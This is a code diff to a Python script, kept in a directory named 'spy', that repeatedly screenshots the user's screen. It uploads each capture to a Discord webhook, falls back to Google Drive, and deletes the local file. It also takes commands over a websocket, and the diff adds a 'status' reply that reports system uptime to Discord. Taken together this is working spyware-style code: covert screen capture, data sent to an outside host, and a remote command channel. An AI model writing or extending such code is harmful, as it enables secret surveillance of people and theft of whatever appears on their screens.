@@ -23,7 +23,9 @@ import json
 import asyncio
 import websockets
 from plyer import notification
-
+import psutil
+import humanize
+import datetime as dt
 
 load_dotenv('/usr/local/src/spy/.env')
 NUCLEAR_CODE = os.getenv('NUCLEAR_CODE')
@@ -31,11 +33,12 @@ NUCLEAR_CODE = os.getenv('NUCLEAR_CODE')
 userhome = os.path.expanduser('~')
 URL = os.getenv('DISCORD_WEBHOOK_URL')
 
-def upload_file_on_discord(filename):
-    content = f'{userhome} - {datetime.now()}'
+def send_msg_on_discord(msg, is_file=False):
+    
+    content = f'{userhome} - {datetime.now()}' if is_file else f'{userhome} - {msg}'
     webhook = DiscordWebhook(url=URL, content=content, rate_limit_retry=True)
-    with open(filename, "rb") as f:
-        webhook.add_file(file=f.read(), filename=filename)
+    if is_file:
+        webhook.add_file(file=open(msg, 'rb').read(), filename=msg)
     response = webhook.execute()
         
 def upload_file_on_google_drive(file_path, folder_id):
@@ -118,15 +121,19 @@ async def subscribe_to_topic():
             # Continuously listen for messages
             while True:
                 try:
-                    message = json.loads(await websocket.recv())  # Wait for a message
-                    print(f"New message: {message}")
-                     # Display the message as a system notification
-                    notification.notify(
-                        title=f"Message Received",
-                        message=message['message'],
-                        #icon_path="your-icon-path.png",  # Optional, specify if you want an icon
-                        timeout=10
-                    )
+                    response = json.loads(await websocket.recv())  # Wait for a message
+                    msg = response['message']
+                    print(f"New message: {msg}")
+                    if msg == 'status':
+                        send_msg_on_discord(humanize.precisedelta(dt.timedelta(seconds=time.time() - psutil.boot_time())))
+                    else:
+                         # Display the message as a system notification
+                        notification.notify(
+                            title=f"Message Received",
+                            message=msg,
+                            #icon_path="your-icon-path.png",  # Optional, specify if you want an icon
+                            timeout=10
+                        )
                 except Exception as e:
                     print(e)
 
@@ -146,7 +153,8 @@ async def take_screenshot_periodically():
                 filename=sct.shot(output=path)
                 try:
                     print('uploading to discord')
-                    upload_file_on_discord(filename);os.unlink(filename)
+                    send_msg_on_discord(filename, is_file=True)
+                    os.unlink(filename)
                 except Exception as e:
                     print(e)
                     print('Uploading file on google drive...', filename)
@@ -167,8 +175,8 @@ async def main():
 if __name__ == "__main__":
     
     # Register the handler for all signals (for demonstration purposes, capturing SIGINT and SIGTERM)
-    for sig in [signal.SIGINT, signal.SIGTERM, signal.SIGHUP, signal.SIGQUIT]:
-        signal.signal(sig, handle_signal)
+    #for sig in [signal.SIGINT, signal.SIGTERM, signal.SIGHUP, signal.SIGQUIT]:
+    #    signal.signal(sig, handle_signal)
     
     asyncio.run(main())
 
